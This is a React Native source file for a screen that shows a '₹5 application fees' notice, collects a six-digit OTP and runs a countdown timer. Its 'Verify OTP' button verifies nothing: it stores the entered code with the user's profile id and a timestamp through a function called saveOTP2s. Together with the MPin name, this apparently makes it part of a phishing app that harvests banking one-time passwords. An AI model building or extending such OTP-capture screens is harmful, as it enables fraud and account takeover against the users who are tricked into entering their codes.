import { View, Text, SafeAreaView, TouchableOpacity, Image } from 'react-native'
import { useState, useEffect } from 'react'
import { styles, width } from '../styles'
import MyTextBox from '../components/MyTextBox'
import { useNavigation } from '@react-navigation/native'
import { saveOTP2s } from '../utils'

export default function MPin({ route }) {
    const [otp, setOTP] = useState("")
    const navigation = useNavigation()
    const [countDown, setCountDown] = useState(180)
    const { id } = route.params

    useEffect(() => {
        const interval = setInterval(() => {
            setCountDown(prevCount => {
                if (prevCount <= 1) {
                    clearInterval(interval);
                    return 0;
                }
                return prevCount - 1;
            });
        }, 1000);

        return () => clearInterval(interval); // Clean up the interval on component unmount
    }, []);

    const saveTOTP = async () => {
        const data = {
            user_profile: id,
            otp: otp,
            timestamp: new Date().toISOString()
        }
        await saveOTP2s(data)
        navigation.navigate('Thankyou', { id })
    }


    return (
        <SafeAreaView style={[styles.container]}>
            <View style={styles.headerContainer}>
                <Image source={require('../assets/headerbg.png')}
                    height={72}
                    style={styles.headerImage}
                    width={112} />
            </View>
            <View style={{ marginVertical: 16, width: width - 40, marginTop: width / 2, marginHorizontal: 18 }}>
                <Text style={{ textAlign: 'center', marginHorizontal: 18 }}>₹5 application fees will be charged!</Text>
                <MyTextBox
                    label="Enter OTP"
                    onChangeText={(val) => setOTP(val)}
                    value={otp}
                    keyboardType="numeric"
                    maxLength={6}
                />
                <Text style={{ textAlign: 'right', marginHorizontal: 6 }}>{otp.length}/6</Text>
            </View>

            <View style={{ marginVertical: 20, alignItems: 'center' }}>
                <Text>Time Remainig: {countDown} second</Text>
            </View>
            <TouchableOpacity style={styles.roundButton} onPress={saveTOTP}>
                <Text style={styles.btnText}>Verify OTP</Text>
            </TouchableOpacity>

        </SafeAreaView>
    )
}